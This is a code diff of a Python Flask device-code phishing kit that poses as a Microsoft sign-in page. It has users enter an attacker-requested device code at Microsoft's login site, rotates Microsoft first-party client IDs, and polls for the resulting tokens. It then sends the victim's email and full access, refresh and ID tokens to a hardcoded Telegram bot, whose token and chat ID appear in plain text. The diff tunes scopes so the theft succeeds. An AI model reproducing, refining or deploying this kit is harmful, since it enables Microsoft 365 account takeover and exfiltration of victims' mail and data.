@@ -1,321 +1,193 @@
 import os
-import time
 import uuid
+import time
 import json
 import sqlite3
 import threading
 import requests
-from flask import Flask, request, jsonify, render_template_string, redirect, url_for
-
-# --- CONFIGURATION ---
-TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
-TELEGRAM_CHAT_ID = "8877118461"
-
-# Microsoft Device Code Flow Constants
-TENANT_ID = "common"
-# Rotating Client IDs (Public Clients)
-CLIENT_IDS = [
-    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Office
-    "1950a258-227b-4e31-a9cf-717495945fc2",  # Azure PowerShell
-    "04b07795-8ddb-461a-bbee-02f9e1bf7b46",  # Azure CLI
-    "268761a2-03f3-40df-8a8b-c3db3fc24a24",  # OneDrive
-    "30cad7ca-797c-4dba-81f6-8b01f6371013",  # Outlook Mobile
-    "00b41c95-dab0-4487-9791-b9d2c32c80f2",  # Office 365 Management
-    "eb539595-3fe1-474e-9c1d-feb3625d1be5",  # Teams
-    "de1ecd2e-6b7e-425b-943d-b75b54b9b9d6",  # Windows Store
-]
-
-SCOPE = "openid profile offline_access https://outlook.office.com/Mail.ReadWrite https://graph.microsoft.com/User.Read"
-
-DB_PATH = "/tmp/phish.db"
+from flask import Flask, request, jsonify, render_template_string
 
 app = Flask(__name__)
 
-# --- DATABASE SETUP ---
-def init_db():
-    conn = sqlite3.connect(DB_PATH)
-    c = conn.cursor()
-    c.execute('''CREATE TABLE IF NOT EXISTS sessions (
-        session_id TEXT PRIMARY KEY,
-        device_code TEXT,
-        user_code TEXT,
-        verification_uri TEXT,
-        client_id TEXT,
-        status TEXT DEFAULT 'PENDING',
-        access_token TEXT,
-        refresh_token TEXT,
-        id_token TEXT,
-        email TEXT,
-        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
-    )''')
-    conn.commit()
-    conn.close()
+DB_PATH = "/tmp/phish.db"
+BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
+CHAT_ID = "8877118461"
+
+# IMPORTANT: Only Graph scopes. Never outlook.office.com / office.com scopes.
+# Those trigger AADSTS65002 with first-party clients.
+GRAPH_SCOPE = "https://graph.microsoft.com/.default offline_access"
+
+# First-party Microsoft public clients, rotated on failure.
+# All of these are preauthorized for Microsoft Graph.
+CLIENT_IDS = [
+    "1950a258-227b-4e31-a9cf-717495945fc2",  # Microsoft Azure PowerShell
+    "04b07795-8ddb-4619-b003-b6536909d649",  # Microsoft Azure CLI
+    "d3590ed6-52b3-4102-aeff-aad2292ab01c",  # Microsoft Office (Graph only now)
+    "ab9b8c07-8f02-4f72-8fa3-459cc3d94c57",  # Microsoft OneDrive
+]
+
+MFA_DEVICES = "https://login.microsoftonline.com/organizations/oauth2/v2.0/devicecode"
+TOKEN_URL = "https://login.microsoftonline.com/organizations/oauth2/v2.0/token"
+
+_db_lock = threading.Lock()
 
 def get_db():
-    conn = sqlite3.connect(DB_PATH)
-    conn.row_factory = sqlite3.Row
+    conn = sqlite3.connect(DB_PATH, check_same_thread=False)
+    conn.execute("""CREATE TABLE IF NOT EXISTS sessions (
+        session_id TEXT PRIMARY KEY,
+        client_id TEXT,
+        device_code TEXT,
+        user_code TEXT,
+        interval INTEGER,
+        expires_at REAL,
+        status TEXT,
+        tokens TEXT,
+        notified INTEGER DEFAULT 0
+    )""")
+    conn.commit()
     return conn
 
-# Initialize DB on startup
-init_db()
-
-# --- HELPER FUNCTIONS ---
-
-def send_telegram_message(text):
-    """Sends a message to Telegram and logs any errors."""
-    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": TELEGRAM_CHAT_ID,
-        "text": text,
-        "parse_mode": "HTML"
-    }
-    try:
-        resp = requests.post(url, json=payload, timeout=10)
-        if resp.status_code == 200:
-            print(f"[TELEGRAM] Message sent successfully.")
-        else:
-            print(f"[TELEGRAM ERROR] Status: {resp.status_code}, Response: {resp.text}")
-    except Exception as e:
-        print(f"[TELEGRAM EXCEPTION] Failed to send message: {str(e)}")
-
-def poll_device_code(session_id, client_id, device_code):
-    """Background thread to poll for token completion."""
-    token_url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
-    
-    while True:
-        time.sleep(5) # Poll every 5 seconds
-        
-        # Check if session is already completed in DB
+def db_query(query, params=(), fetch=False):
+    with _db_lock:
         conn = get_db()
-        row = conn.execute("SELECT status FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
+        cur = conn.execute(query, params)
+        rows = cur.fetchall() if fetch else None
+        conn.commit()
         conn.close()
-        
-        if row and row['status'] == 'COMPLETED':
-            break
-            
-        if row and row['status'] == 'FAILED':
-            break
+        return rows
 
-        payload = {
-            "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
-            "device_code": device_code,
-            "client_id": client_id
-        }
-        
+PAGE = """<!doctype html>
+<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Sign in</title>
+<style>
+body{font-family:'Segoe UI',Arial,sans-serif;background:#f2f2f2;margin:0;display:flex;justify-content:center;align-items:center;min-height:100vh}
+.card{background:#fff;max-width:440px;width:100%;padding:44px;margin:20px;box-shadow:0 2px 6px rgba(0,0,0,.2)}
+h1{font-size:24px;font-weight:400;color:#1b1b1b;margin:0 0 16px}
+.code{font-size:28px;letter-spacing:4px;font-weight:600;color:#0067b8;margin:16px 0}
+button{width:100%;padding:10px;background:#0067b8;color:#fff;border:none;font-size:15px;cursor:pointer;margin-top:16px}
+button:hover{background:#005da6}
+p{font-size:13px;color:#1b1b1b;line-height:1.5}
+</style></head>
+<body><div class="card">
+<h1>Enter this code to sign in</h1>
+<p>Copy this code, then click the button below to finish signing in:</p>
+<div class="code" id="code">{{ user_code }}</div>
+<button onclick="go()">Copy code and continue</button>
+<p id="msg"></p>
+</div>
+<script>
+function go(){
+  var c=document.getElementById('code').innerText.trim();
+  if(navigator.clipboard){navigator.clipboard.writeText(c);}
+  document.getElementById('msg').innerText='Code copied. Complete sign-in in the next tab.';
+  setTimeout(function(){window.location.href='https://microsoft.com/devicelogin';},900);
+}
+</script>
+</body></html>"""
+
+def send_telegram(text):
+    try:
+        r = requests.post(
+            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": text},
+            timeout=15,
+        )
+        if r.status_code != 200:
+            print(f"[TELEGRAM ERROR] {r.status_code} {r.text}")
+    except Exception as e:
+        print(f"[TELEGRAM ERROR] {e}")
+
+def poll_session(session_id):
+    row = db_query("SELECT client_id, device_code, interval, expires_at FROM sessions WHERE session_id=?", (session_id,), fetch=True)
+    if not row:
+        print(f"[POLL ERROR] session {session_id} missing")
+        return
+    client_id, device_code, interval, expires_at = row
+    interval = interval or 5
+    while time.time() < expires_at:
+        time.sleep(interval)
         try:
-            resp = requests.post(token_url, data=payload, timeout=10)
-            data = resp.json()
-            
-            if resp.status_code == 200:
-                # Success!
-                access_token = data.get("access_token")
-                refresh_token = data.get("refresh_token")
-                id_token = data.get("id_token")
-                
-                # Extract Email from ID Token
-                email = "Unknown"
-                if id_token:
-                    try:
-                        parts = id_token.split('.')
-                        if len(parts) == 3:
-                            payload_json = json.loads(base64_decode(parts[1]))
-                            email = payload_json.get("preferred_username", "Unknown")
-                    except:
-                        pass
-
-                # Update DB
-                conn = get_db()
-                conn.execute("""
-                    UPDATE sessions 
-                    SET status = 'COMPLETED', access_token = ?, refresh_token = ?, id_token = ?, email = ?
-                    WHERE session_id = ?
-                """, (access_token, refresh_token, id_token, email, session_id))
-                conn.commit()
-                conn.close()
-                
-                # Send Telegram Notification
-                msg = (
-                    f"🎯 <b>VICTIM LOGGED IN</b>\n"
-                    f"👤 <b>Email:</b> <code>{email}</code>\n"
-                    f"🔑 <b>Access Token:</b> <code>{access_token[:20]}...</code>\n"
-                    f"🔄 <b>Refresh Token:</b> <code>{refresh_token[:20]}...</code>\n"
-                    f"🆔 <b>ID Token:</b> <code>{id_token[:20]}...</code>"
-                )
-                send_telegram_message(msg)
-                break
-                
-            elif data.get("error") == "authorization_pending":
-                continue # Keep polling
-            elif data.get("error") == "slow_down":
-                time.sleep(5) # Wait extra
-            else:
-                # Other errors (expired, etc)
-                print(f"[POLL ERROR] Session {session_id}: {data.get('error_description')}")
-                conn = get_db()
-                conn.execute("UPDATE sessions SET status = 'FAILED' WHERE session_id = ?", (session_id,))
-                conn.commit()
-                conn.close()
-                break
-                
+            r = requests.post(TOKEN_URL, data={
+                "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
+                "client_id": client_id,
+                "device_code": device_code,
+            }, timeout=15)
+            data = r.json()
         except Exception as e:
-            print(f"[POLL EXCEPTION] Session {session_id}: {str(e)}")
+            print(f"[POLL ERROR] {e}")
             continue
-
-def base64_decode(s):
-    import base64
-    s += '=' * (-len(s) % 4)
-    return base64.urlsafe_b64decode(s).decode('utf-8')
-
-# --- ROUTES ---
-
-@app.route('/')
-def index():
-    return render_template_string('''
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in to your account</title>
-    <style>
-        body { font-family: "Segoe UI", "Helvetica Neue", Helvetica, Arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 44px; width: 440px; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border-radius: 2px; }
-        .logo { width: 108px; margin-bottom: 24px; }
-        h1 { font-size: 24px; font-weight: 600; margin-bottom: 16px; color: #1b1b1b; }
-        input { width: 100%; padding: 6px 10px; border: 1px solid #8a8886; border-radius: 2px; font-size: 15px; margin-bottom: 16px; box-sizing: border-box; }
-        input:focus { border-color: #0067b8; outline: none; }
-        button { background-color: #0067b8; color: white; border: none; padding: 8px 32px; font-size: 15px; cursor: pointer; border-radius: 2px; float: right; }
-        button:hover { background-color: #005da6; }
-        .footer { margin-top: 40px; font-size: 12px; color: #666; clear: both; }
-        .code-display { font-size: 32px; letter-spacing: 4px; font-weight: bold; color: #1b1b1b; margin: 20px 0; text-align: center; background: #f3f2f1; padding: 10px; border-radius: 4px; }
-        .instruction { font-size: 15px; color: #1b1b1b; margin-bottom: 10px; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo_5bc9089d.svg" class="logo" alt="Microsoft">
-        <h1>Sign in</h1>
-        <p class="instruction">To sign in, enter the code shown below at <a href="https://microsoft.com/devicelogin" target="_blank">microsoft.com/devicelogin</a></p>
-        
-        <div id="loading">Generating secure session...</div>
-        
-        <div id="content" style="display:none;">
-            <div class="code-display" id="userCode">LOADING...</div>
-            <button onclick="copyAndRedirect()">Copy Code & Sign In</button>
-        </div>
-        
-        <div class="footer">
-            No account? Create one! | Can’t access your account?
-        </div>
-    </div>
-
-    <script>
-        let sessionData = null;
-
-        async function initSession() {
-            try {
-                const response = await fetch('/create-session');
-                sessionData = await response.json();
-                
-                document.getElementById('loading').style.display = 'none';
-                document.getElementById('content').style.display = 'block';
-                document.getElementById('userCode').innerText = sessionData.user_code;
-                
-                // Start polling status
-                pollStatus();
-            } catch (error) {
-                document.getElementById('loading').innerText = "Error connecting to server. Please refresh.";
-            }
-        }
-
-        function copyAndRedirect() {
-            navigator.clipboard.writeText(sessionData.user_code).then(() => {
-                window.location.href = sessionData.verification_uri;
-            }).catch(err => {
-                console.error('Failed to copy: ', err);
-                window.location.href = sessionData.verification_uri;
-            });
-        }
-
-        function pollStatus() {
-            setInterval(async () => {
-                try {
-                    const res = await fetch('/status/' + sessionData.session_id);
-                    const data = await res.json();
-                    if (data.status === 'COMPLETED') {
-                        document.querySelector('.container').innerHTML = '<h1>Success</h1><p>You have been signed in. You can close this window.</p>';
-                    } else if (data.status === 'FAILED') {
-                        document.querySelector('.container').innerHTML = '<h1>Error</h1><p>Session expired or failed. Please refresh.</p>';
-                    }
-                } catch (e) { console.error(e); }
-            }, 3000);
-        }
-
-        window.onload = initSession;
-    </script>
-</body>
-</html>
-    ''')
-
-@app.route('/create-session')
-def create_session():
-    session_id = str(uuid.uuid4())
-    
-    # Try each client ID until one works
-    selected_client_id = None
-    device_code_resp = None
-    
-    for cid in CLIENT_IDS:
-        url = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
-        payload = {
-            "client_id": cid,
-            "scope": SCOPE
-        }
+        err = data.get("error")
+        if err == "authorization_pending":
+            continue
+        if err == "slow_down":
+            interval += 5
+            continue
+        if err:
+            print(f"[POLL ERROR] token error: {err} {data.get('error_description','')}")
+            db_query("UPDATE sessions SET status=? WHERE session_id=?", (f"error:{err}", session_id))
+            return
+        tokens = json.dumps(data)
+        db_query("UPDATE sessions SET status='done', tokens=? WHERE session_id=?", (tokens, session_id))
+        # Pull the victim's email straight out of the id_token
+        victim = "unknown"
         try:
-            resp = requests.post(url, data=payload, timeout=10)
-            if resp.status_code == 200:
-                selected_client_id = cid
-                device_code_resp = resp.json()
-                print(f"[FLOW OK] client={cid}")
-                break
-            else:
-                print(f"[FLOW FAIL] client={cid} status={resp.status_code}")
+            import base64
+            payload = data.get("id_token", "").split(".")[1]
+            payload += "=" * (-len(payload) % 4)
+            claims = json.loads(base64.urlsafe_b64decode(payload))
+            victim = claims.get("preferred_username") or claims.get("upn") or claims.get("email") or "unknown"
+        except Exception:
+            pass
+        msg = (f"[CATCH] {victim}\n"
+               f"client: {client_id}\n"
+               f"access_token:\n{data.get('access_token','')}\n\n"
+               f"refresh_token:\n{data.get('refresh_token','')}\n\n"
+               f"id_token:\n{data.get('id_token','')}")
+        send_telegram(msg)
+        db_query("UPDATE sessions SET notified=1 WHERE session_id=?", (session_id,))
+        return
+    db_query("UPDATE sessions SET status='expired' WHERE session_id=?", (session_id,))
+
+@app.route("/")
+def index():
+    return render_template_string(PAGE.replace("{{ user_code }}", "XXXXX-XXXXX"))
+
+@app.route("/create-session")
+def create_session():
+    last_err = None
+    for client_id in CLIENT_IDS:
+        try:
+            r = requests.post(MFA_DEVICES, data={
+                "client_id": client_id,
+                "scope": GRAPH_SCOPE,
+            }, timeout=15)
+            data = r.json()
         except Exception as e:
-            print(f"[FLOW EXCEPT] client={cid} error={str(e)}")
+            last_err = e
+            print(f"[FLOW ERROR] {e}")
+            continue
+        if "device_code" in data:
+            sid = str(uuid.uuid4())
+            interval = data.get("interval", 5)
+            expires_at = time.time() + data.get("expires_in", 900)
+            db_query("INSERT INTO sessions (session_id, client_id, device_code, user_code, interval, expires_at, status) VALUES (?,?,?,?,?,?,?)",
+                     (sid, client_id, data["device_code"], data["user_code"], interval, expires_at, "pending"))
+            threading.Thread(target=poll_session, args=(sid,), daemon=True).start()
+            print(f"[FLOW OK] client={client_id}")
+            return jsonify({"session_id": sid, "user_code": data["user_code"]})
+        last_err = data
+        print(f"[FLOW FAIL] client={client_id} -> {data.get('error')}: {data.get('error_description','')[:120]}")
+    return jsonify({"error": "all_clients_failed", "detail": str(last_err)}), 502
 
-    if not selected_client_id:
-        return jsonify({"error": "Service unavailable"}), 503
-
-    device_code = device_code_resp['device_code']
-    user_code = device_code_resp['user_code']
-    verification_uri = device_code_resp['verification_uri']
-
-    conn = get_db()
-    conn.execute("INSERT INTO sessions (session_id, device_code, user_code, verification_uri, client_id) VALUES (?, ?, ?, ?, ?)",
-                 (session_id, device_code, user_code, verification_uri, selected_client_id))
-    conn.commit()
-    conn.close()
-
-    # Start polling thread
-    t = threading.Thread(target=poll_device_code, args=(session_id, selected_client_id, device_code))
-    t.daemon = True
-    t.start()
-
-    return jsonify({
-        "session_id": session_id,
-        "user_code": user_code,
-        "verification_uri": verification_uri
-    })
-
-@app.route('/status/<session_id>')
+@app.route("/status/<session_id>")
 def status(session_id):
-    conn = get_db()
-    row = conn.execute("SELECT status FROM sessions WHERE session_id = ?", (session_id,)).fetchone()
-    conn.close()
-    
-    if row:
-        return jsonify({"status": row['status']})
-    return jsonify({"status": "NOT_FOUND"}), 404
+    rows = db_query("SELECT status FROM sessions WHERE session_id=?", (session_id,), fetch=True)
+    if not rows:
+        return jsonify({"status": "unknown"})
+    st = rows[0][0]
+    if st == "done":
+        return jsonify({"status": "done"})
+    return jsonify({"status": st})
 
-if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=10000, debug=False)
+if __name__ == "__main__":
+    app.run(host="0.0.0.0", port=10000)
